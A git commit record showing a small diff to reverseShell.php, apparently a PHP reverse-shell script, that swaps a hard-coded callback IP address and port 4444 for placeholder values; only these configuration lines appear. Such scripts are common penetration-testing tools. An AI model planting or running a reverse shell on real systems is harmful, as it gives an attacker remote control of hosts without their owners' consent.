ec7040c6b73000d844ad0bc862d1c3656faebb44
al1xan <87652841+al1xan@users.noreply.github.com>
2022-08-02 10:09:04 +0400

    Update reverseShell.php

--- reverseShell.php
+++ reverseShell.php
@@ -5,8 +5,8 @@
 
   set_time_limit (0);
   $VERSION = "1.0";
-  $ip = '192.168.100.1';  // You have changed this
-  $port = 4444;  // And this
+  $ip = 'ip_adress';  // You have changed this
+  $port = port_number;  // And this
   $chunk_size = 1400;
   $write_a = null;
   $error_a = null;
